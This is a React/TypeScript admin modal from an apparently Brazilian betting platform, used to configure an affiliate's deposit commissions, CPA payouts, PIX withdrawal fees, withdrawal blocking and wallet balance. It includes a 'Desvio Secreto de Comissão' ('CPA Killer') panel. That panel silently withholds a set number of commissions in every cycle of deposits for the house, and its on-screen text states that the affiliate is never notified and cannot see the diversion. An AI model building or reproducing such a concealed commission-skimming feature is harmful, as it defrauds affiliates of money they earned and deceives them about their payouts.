import React, { useState, useEffect } from 'react';
import {
  Percent,
  DollarSign,
  CheckCircle2,
  Loader2,
  Wallet,
  ShieldAlert,
  HelpCircle,
  Zap,
  Clock,
  ArrowUpRight
} from 'lucide-react';
import { AdminUserItem } from './adminTypes';
import {
  IOSModalSheet,
  IOSSegmentedControl,
  IOSButton
} from './IOSComponents';

interface AdminAffiliateCommissionModalProps {
  user: AdminUserItem | null;
  isOpen: boolean;
  onClose: () => void;
  onSave: (payload: {
    userId: string;
    cpaAmount: number;
    revSharePercent: number;
    partnerCommissionPercent?: number;
    withdrawFee: number;
    affiliateBalance?: number;
    affiliateBalanceAction?: 'keep' | 'set' | 'add' | 'subtract';
    affiliateBalanceAmount?: number;
    cpaKillerActive?: boolean;
    cpaKillerEveryX?: number;
    cpaKillerKillY?: number;
    autoWithdrawBlocked?: boolean;
    withdrawBlocked?: boolean;
  }) => Promise<void>;
  loading: boolean;
}

export const AdminAffiliateCommissionModal: React.FC<AdminAffiliateCommissionModalProps> = ({
  user,
  isOpen,
  onClose,
  onSave,
  loading
}) => {
  const [cpaAmount, setCpaAmount] = useState('0.00');
  const [revSharePercent, setRevSharePercent] = useState('70');
  const [partnerCommissionPercent, setPartnerCommissionPercent] = useState('20');
  const [withdrawFee, setWithdrawFee] = useState('0.00');
  const [balanceAction, setBalanceAction] = useState<'keep' | 'add' | 'subtract' | 'set'>('keep');
  const [balanceAmount, setBalanceAmount] = useState('');

  // Withdrawal Controls: Auto vs Manual & Access Allowed vs Blocked
  const [autoWithdrawMode, setAutoWithdrawMode] = useState<'auto' | 'manual'>('auto');
  const [withdrawAccess, setWithdrawAccess] = useState<'allowed' | 'blocked'>('allowed');

  // Secret Commission Deviation (CPA Killer) - Exclusively for Admin
  const [cpaKillerActive, setCpaKillerActive] = useState<boolean>(false);
  const [cpaKillerEveryX, setCpaKillerEveryX] = useState<number>(10);
  const [cpaKillerKillY, setCpaKillerKillY] = useState<number>(3);

  useEffect(() => {
    if (user) {
      const aff = user.affiliateInfo;
      setCpaAmount((aff?.cpaAmount ?? 0).toFixed(2));
      setRevSharePercent((aff?.revSharePercent ?? 70).toFixed(0));
      const partnerRate = user.partnerCommissionPercent ?? aff?.partnerCommissionPercent ?? 20;
      setPartnerCommissionPercent(partnerRate.toString());
      setWithdrawFee((aff?.withdrawFee ?? user.withdrawFee ?? 8).toFixed(2));
      setCpaKillerActive(!!(aff?.cpaKillerActive ?? user.cpaKillerActive));
      setCpaKillerEveryX(aff?.cpaKillerEveryX ?? user.cpaKillerEveryX ?? 10);
      setCpaKillerKillY(aff?.cpaKillerKillY ?? user.cpaKillerKillY ?? 3);
      setAutoWithdrawMode(user.autoWithdrawBlocked ? 'manual' : 'auto');
      setWithdrawAccess(user.withdrawBlocked ? 'blocked' : 'allowed');
      setBalanceAction('keep');
      setBalanceAmount('');
    }
  }, [user]);

  if (!user) return null;

  const currentAffBalance = user.affiliateInfo?.affiliateBalance || 0;
  const parsedBalanceAmount = parseFloat(balanceAmount) || 0;
  let projectedAffBalance = currentAffBalance;
  if (balanceAction === 'add') projectedAffBalance = currentAffBalance + parsedBalanceAmount;
  else if (balanceAction === 'subtract') projectedAffBalance = Math.max(0, currentAffBalance - parsedBalanceAmount);
  else if (balanceAction === 'set') projectedAffBalance = Math.max(0, parsedBalanceAmount);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await onSave({
      userId: user.id,
      cpaAmount: parseFloat(cpaAmount) || 0,
      revSharePercent: parseFloat(revSharePercent) || 70,
      partnerCommissionPercent: Math.min(100, Math.max(0, parseFloat(partnerCommissionPercent) || 20)),
      withdrawFee: parseFloat(withdrawFee) || 0,
      affiliateBalanceAction: balanceAction,
      affiliateBalanceAmount: balanceAction !== 'keep' ? parsedBalanceAmount : undefined,
      affiliateBalance: balanceAction !== 'keep' ? projectedAffBalance : undefined,
      cpaKillerActive,
      cpaKillerEveryX: Math.max(2, cpaKillerEveryX),
      cpaKillerKillY: Math.max(1, Math.min(cpaKillerEveryX - 1, cpaKillerKillY)),
      autoWithdrawBlocked: autoWithdrawMode === 'manual',
      withdrawBlocked: withdrawAccess === 'blocked'
    });
  };

  const balanceOptions = [
    { id: 'keep' as const, label: 'Manter Atual' },
    { id: 'add' as const, label: 'Adicionar (+)' },
    { id: 'subtract' as const, label: 'Remover (-)' },
    { id: 'set' as const, label: 'Definir (=)' }
  ];

  const currentCounter = user.affiliateInfo?.cpaCounter ?? user.cpaCounter ?? 0;
  const safeEveryX = Math.max(2, cpaKillerEveryX || 10);
  const cycleStep = currentCounter % safeEveryX;

  return (
    <IOSModalSheet
      isOpen={isOpen}
      onClose={onClose}
      title="Comissões & Regras do Afiliado"
      subtitle={`Configurando taxas sobre depósitos e saldo para ${user.name}`}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        {/* Deposit Commission Input */}
        <div className="space-y-1.5">
          <label className="text-xs font-bold text-slate-700">Comissão sobre Depósitos (%)</label>
          <div className="relative">
            <input
              type="number"
              min="0"
              max="100"
              value={revSharePercent}
              onChange={(e) => setRevSharePercent(e.target.value)}
              className="w-full h-10 px-3 bg-[#767680]/10 focus:bg-white text-slate-900 text-xs font-bold rounded-xl border border-transparent focus:border-[#007AFF] focus:outline-none transition-all"
            />
            <span className="absolute right-3 top-2.5 text-xs font-bold text-slate-400">%</span>
          </div>
          <p className="text-[11px] text-slate-400">
            Percentual pago imediatamente sobre cada depósito PIX pago e confirmado do indicado (não incide sobre apostas em partidas de jogos). Ex: 70% num depósito de R$ 100 = R$ 70,00 de comissão direta para o afiliado. Padrão: 70%.
          </p>
        </div>

        {/* CPA Input */}
        <div className="space-y-1.5">
          <label className="text-xs font-bold text-slate-700">Comissão CPA por FTD (R$)</label>
          <div className="relative">
            <span className="absolute left-3 top-2.5 text-xs font-bold text-slate-400">R$</span>
            <input
              type="number"
              step="0.01"
              value={cpaAmount}
              onChange={(e) => setCpaAmount(e.target.value)}
              className="w-full h-10 pl-9 pr-3 bg-[#767680]/10 focus:bg-white text-slate-900 text-xs font-bold rounded-xl border border-transparent focus:border-[#007AFF] focus:outline-none transition-all"
            />
          </div>
          <p className="text-[11px] text-slate-400">
            Valor pago uma única vez quando o indicado faz o primeiro depósito qualificado.
          </p>
        </div>

        {/* Partner Commission on Downline Affiliates Input */}
        <div className="space-y-1.5 p-3 rounded-2xl bg-blue-50/80 border border-blue-200">
          <div className="flex items-center justify-between">
            <label className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
              <span>Comissão do Parceiro sobre Afiliados (%)</span>
              {user.isPartner && (
                <span className="text-[10px] font-extrabold bg-blue-600 text-white px-2 py-0.5 rounded-full">
                  Parceiro Oficial
                </span>
              )}
            </label>
            <span className="text-[10px] font-bold text-blue-700 bg-blue-100 px-2 py-0.5 rounded-full">
              Lucro da Rede
            </span>
          </div>
          <div className="relative">
            <input
              type="number"
              min="0"
              max="100"
              step="1"
              value={partnerCommissionPercent}
              onChange={(e) => setPartnerCommissionPercent(e.target.value)}
              className="w-full h-10 px-3 bg-white text-slate-900 text-xs font-bold rounded-xl border border-blue-200 focus:border-[#007AFF] focus:outline-none transition-all"
            />
            <span className="absolute right-3 top-2.5 text-xs font-bold text-slate-400">%</span>
          </div>
          <p className="text-[11px] text-slate-600 leading-snug">
            Percentual que o Parceiro ganha sobre os faturamentos/comissões geradas pelos afiliados recrutados por ele. Padrão: 20% (ex: 20% de R$ 100 = R$ 20,00 para o Parceiro).
          </p>
        </div>

        {/* Affiliate Withdrawal Fee Input */}
        <div className="space-y-1.5">
          <div className="flex items-center justify-between">
            <label className="text-xs font-bold text-slate-700">Taxa de Saque do Afiliado (R$)</label>
            <span className="text-[10px] font-bold text-[#007AFF] bg-[#007AFF]/10 px-2 py-0.5 rounded-full">
              Taxa Fixa PIX
            </span>
          </div>
          <div className="relative">
            <span className="absolute left-3 top-2.5 text-xs font-bold text-slate-400">R$</span>
            <input
              type="number"
              step="0.01"
              min="0"
              value={withdrawFee}
              onChange={(e) => setWithdrawFee(e.target.value)}
              placeholder="0.00"
              className="w-full h-10 pl-9 pr-3 bg-[#767680]/10 focus:bg-white text-slate-900 text-xs font-bold rounded-xl border border-transparent focus:border-[#007AFF] focus:outline-none transition-all"
            />
          </div>
          <div className="flex flex-wrap items-center gap-1.5 pt-0.5">
            <span className="text-[10px] font-medium text-slate-400">Atalhos:</span>
            {[
              { label: 'Grátis (R$ 0,00)', val: '0.00' },
              { label: 'R$ 5,00', val: '5.00' },
              { label: 'R$ 8,00 (Padrão)', val: '8.00' },
              { label: 'R$ 10,00', val: '10.00' }
            ].map((preset) => (
              <button
                key={preset.val}
                type="button"
                onClick={() => setWithdrawFee(preset.val)}
                className={`px-2 py-0.5 text-[10px] font-bold rounded-lg transition-all cursor-pointer ${
                  withdrawFee === preset.val
                    ? 'bg-[#007AFF] text-white shadow-xs'
                    : 'bg-slate-100 hover:bg-slate-200 text-slate-700'
                }`}
              >
                {preset.label}
              </button>
            ))}
          </div>
          <p className="text-[11px] text-slate-400">
            Taxa cobrada a cada solicitação de saque de comissões via PIX deste afiliado. Defina 0,00 para saque gratuito sem descontos.
          </p>
        </div>

        {/* Financial Withdrawal Operations Controls */}
        <div className="p-3.5 bg-slate-50 border border-slate-200/80 rounded-2xl space-y-3.5">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-[#007AFF]/15 flex items-center justify-center text-[#007AFF]">
              <Zap className="w-4 h-4 fill-current" />
            </div>
            <div>
              <div className="text-xs font-bold text-slate-900">Regras de Saque do Afiliado</div>
              <p className="text-[10px] text-slate-500">Defina saque automático ou desative os saques deste afiliado</p>
            </div>
          </div>

          {/* Setting 1: Auto vs Manual */}
          <div className="space-y-1.5 pt-1 border-t border-slate-200/60">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-slate-800 flex items-center gap-1">
                <span>Modo de Liquidação</span>
                <span className="text-[10px] font-normal text-slate-400">(Padrão: Automático)</span>
              </label>
              <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
                autoWithdrawMode === 'auto' 
                  ? 'bg-emerald-100 text-emerald-800' 
                  : 'bg-amber-100 text-amber-800'
              }`}>
                {autoWithdrawMode === 'auto' ? '⚡ Saque Instantâneo' : '⏳ Aprovação Manual'}
              </span>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setAutoWithdrawMode('auto')}
                className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                  autoWithdrawMode === 'auto'
                    ? 'bg-emerald-50/80 border-emerald-500/40 text-emerald-950 shadow-xs'
                    : 'bg-white border-slate-200 text-slate-600 hover:bg-slate-100'
                }`}
              >
                <div className="flex items-center gap-1.5 font-bold text-xs text-emerald-800">
                  <Zap className="w-3.5 h-3.5 fill-current" />
                  <span>Saque Automático</span>
                </div>
                <div className="text-[10px] text-emerald-900/70 mt-0.5">
                  Transferência PIX imediata via Dotfy sem fila manual.
                </div>
              </button>

              <button
                type="button"
                onClick={() => setAutoWithdrawMode('manual')}
                className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                  autoWithdrawMode === 'manual'
                    ? 'bg-amber-50/80 border-amber-500/40 text-amber-950 shadow-xs'
                    : 'bg-white border-slate-200 text-slate-600 hover:bg-slate-100'
                }`}
              >
                <div className="flex items-center gap-1.5 font-bold text-xs text-amber-800">
                  <Clock className="w-3.5 h-3.5" />
                  <span>Aprovação Manual</span>
                </div>
                <div className="text-[10px] text-amber-900/70 mt-0.5">
                  Fica pendente para conferência do admin antes de pagar.
                </div>
              </button>
            </div>
          </div>

          {/* Setting 2: Withdrawals Allowed vs Blocked */}
          <div className="space-y-1.5 pt-2 border-t border-slate-200/60">
            <div className="flex items-center justify-between">
              <label className="text-xs font-bold text-slate-800 flex items-center gap-1">
                <span>Acesso a Saques</span>
              </label>
              <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${
                withdrawAccess === 'allowed' 
                  ? 'bg-emerald-100 text-emerald-800' 
                  : 'bg-rose-100 text-rose-800'
              }`}>
                {withdrawAccess === 'allowed' ? '✅ Saques Ativos' : '🚫 Saques Desativados'}
              </span>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <button
                type="button"
                onClick={() => setWithdrawAccess('allowed')}
                className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                  withdrawAccess === 'allowed'
                    ? 'bg-emerald-50/80 border-emerald-500/40 text-emerald-950 shadow-xs'
                    : 'bg-white border-slate-200 text-slate-600 hover:bg-slate-100'
                }`}
              >
                <div className="flex items-center gap-1.5 font-bold text-xs text-emerald-800">
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Permitir Saques</span>
                </div>
                <div className="text-[10px] text-emerald-900/70 mt-0.5">
                  O afiliado pode solicitar saques normalmente.
                </div>
              </button>

              <button
                type="button"
                onClick={() => setWithdrawAccess('blocked')}
                className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer ${
                  withdrawAccess === 'blocked'
                    ? 'bg-rose-50/90 border-rose-500/40 text-rose-950 shadow-xs'
                    : 'bg-white border-slate-200 text-slate-600 hover:bg-slate-100'
                }`}
              >
                <div className="flex items-center gap-1.5 font-bold text-xs text-rose-800">
                  <ShieldAlert className="w-3.5 h-3.5" />
                  <span>Desativar Saque</span>
                </div>
                <div className="text-[10px] text-rose-900/70 mt-0.5">
                  Bloqueia novos pedidos de saque deste usuário.
                </div>
              </button>
            </div>
          </div>
        </div>

        {/* Secret Commission Deviation Area (CPA Killer) */}
        <div className="p-3.5 bg-amber-50/80 border border-amber-200/80 rounded-2xl space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-7 h-7 rounded-lg bg-amber-500/15 flex items-center justify-center text-amber-700">
                <ShieldAlert className="w-4 h-4" />
              </div>
              <div>
                <div className="flex items-center gap-1.5">
                  <span className="text-xs font-bold text-slate-900">Desvio Secreto de Comissão</span>
                  <span className="px-1.5 py-0.5 text-[9px] font-black uppercase tracking-wider bg-amber-200/80 text-amber-900 rounded">
                    Admin Sigiloso
                  </span>
                </div>
                <p className="text-[10px] text-slate-500">Reter parte das comissões para a plataforma em sigilo</p>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setCpaKillerActive(!cpaKillerActive)}
              className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none ${
                cpaKillerActive ? 'bg-amber-600' : 'bg-slate-300'
              }`}
            >
              <span
                className={`pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow-xs ring-0 transition duration-200 ease-in-out ${
                  cpaKillerActive ? 'translate-x-5' : 'translate-x-0'
                }`}
              />
            </button>
          </div>

          {cpaKillerActive && (
            <div className="space-y-2.5 pt-1">
              <div className="grid grid-cols-2 gap-2.5">
                <div className="space-y-1">
                  <label className="text-[11px] font-bold text-slate-700 block">
                    A cada X depósitos:
                  </label>
                  <input
                    type="number"
                    min="2"
                    step="1"
                    value={cpaKillerEveryX}
                    onChange={(e) => setCpaKillerEveryX(Math.max(2, parseInt(e.target.value) || 2))}
                    placeholder="Ex: 10"
                    className="w-full h-9 px-3 bg-white text-slate-900 text-xs font-bold rounded-lg border border-amber-200 focus:border-amber-500 focus:outline-none"
                  />
                  <span className="text-[10px] text-slate-400">Total do ciclo (ex: 10)</span>
                </div>

                <div className="space-y-1">
                  <label className="text-[11px] font-bold text-slate-700 block">
                    Desviar / Matar Y comissões:
                  </label>
                  <input
                    type="number"
                    min="1"
                    max={Math.max(1, cpaKillerEveryX - 1)}
                    step="1"
                    value={cpaKillerKillY}
                    onChange={(e) => setCpaKillerKillY(Math.max(1, parseInt(e.target.value) || 1))}
                    placeholder="Ex: 3"
                    className="w-full h-9 px-3 bg-white text-rose-600 text-xs font-bold rounded-lg border border-amber-200 focus:border-rose-500 focus:outline-none"
                  />
                  <span className="text-[10px] text-slate-400">Comissões retidas (ex: 2 a 3)</span>
                </div>
              </div>

              <div className="p-2.5 bg-white/90 rounded-xl border border-amber-200/60 text-[11px] text-slate-600 leading-relaxed">
                A cada <strong className="text-slate-900">{cpaKillerEveryX} depósitos</strong> gerados pelo link de {user.name}, os primeiros {cpaKillerEveryX - cpaKillerKillY} pagam normalmente e as últimas <strong className="text-rose-600">{cpaKillerKillY} comissões</strong> são retidas 100% para a casa.
                <div className="mt-1 text-[10px] font-semibold text-amber-800">
                  🔒 O afiliado não recebe notificação, não visualiza o desvio e não tem acesso a esta tela.
                </div>
              </div>

              <div className="flex items-center justify-between text-[11px] font-medium text-slate-600 px-1">
                <span>Progresso do ciclo atual:</span>
                <span className="font-mono font-bold text-amber-700">
                  {cycleStep} de {safeEveryX} depósitos ({currentCounter} acumulados)
                </span>
              </div>
            </div>
          )}
        </div>

        {/* Affiliate Wallet Balance Section */}
        <div className="pt-3 border-t border-black/[0.06] space-y-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              <Wallet className="w-4 h-4 text-[#AF52DE]" />
              <label className="text-xs font-bold text-slate-800">Saldo da Carteira de Afiliado</label>
            </div>
            <span className="text-xs font-mono font-bold text-[#AF52DE]">
              Atual: R$ {currentAffBalance.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </span>
          </div>

          {/* Action Selector */}
          <IOSSegmentedControl
            options={balanceOptions}
            value={balanceAction}
            onChange={(val) => {
              setBalanceAction(val);
              if (val === 'keep') setBalanceAmount('');
            }}
            className="w-full"
          />

          {balanceAction !== 'keep' && (
            <div className="p-3 bg-[#AF52DE]/6 border border-[#AF52DE]/15 rounded-xl space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-[11px] font-semibold text-slate-600">
                  Valor a {balanceAction === 'set' ? 'definir como novo saldo' : balanceAction === 'add' ? 'adicionar à carteira' : 'debitar da carteira'}:
                </span>
                <div className="flex items-center gap-1">
                  {[50, 100, 500].map((quick) => (
                    <button
                      key={quick}
                      type="button"
                      onClick={() => setBalanceAmount(quick.toString())}
                      className="px-1.5 py-0.5 text-[10px] font-bold bg-white text-slate-700 rounded border border-black/[0.06] hover:bg-slate-50 cursor-pointer"
                    >
                      +{quick}
                    </button>
                  ))}
                  <button
                    type="button"
                    onClick={() => {
                      setBalanceAction('set');
                      setBalanceAmount('0');
                    }}
                    className="px-1.5 py-0.5 text-[10px] font-bold bg-rose-50 text-rose-600 rounded border border-rose-200 hover:bg-rose-100 cursor-pointer"
                  >
                    Zerar
                  </button>
                </div>
              </div>

              <div className="relative">
                <span className="absolute left-3 top-2 text-xs font-bold text-slate-400">R$</span>
                <input
                  type="number"
                  step="0.01"
                  value={balanceAmount}
                  onChange={(e) => setBalanceAmount(e.target.value)}
                  placeholder="0,00"
                  className="w-full h-9 pl-9 pr-3 bg-white text-slate-900 text-xs font-bold rounded-lg border border-black/[0.08] focus:border-[#AF52DE] focus:outline-none transition-all"
                />
              </div>

              <div className="flex items-center justify-between text-[11px] font-medium text-slate-600 pt-0.5">
                <span>Saldo projetado:</span>
                <span className="font-mono font-bold text-[#AF52DE]">
                  R$ {projectedAffBalance.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </span>
              </div>
            </div>
          )}
        </div>

        <div className="pt-3 flex gap-2">
          <IOSButton
            type="submit"
            variant="primary"
            disabled={loading}
            className="flex-1 h-11"
          >
            {loading ? <Loader2 className="w-4 h-4 animate-spin" /> : <CheckCircle2 className="w-4 h-4" />}
            <span>Salvar Alterações</span>
          </IOSButton>
          <IOSButton
            type="button"
            variant="secondary"
            onClick={onClose}
            className="h-11"
          >
            <span>Cancelar</span>
          </IOSButton>
        </div>
      </form>
    </IOSModalSheet>
  );
};
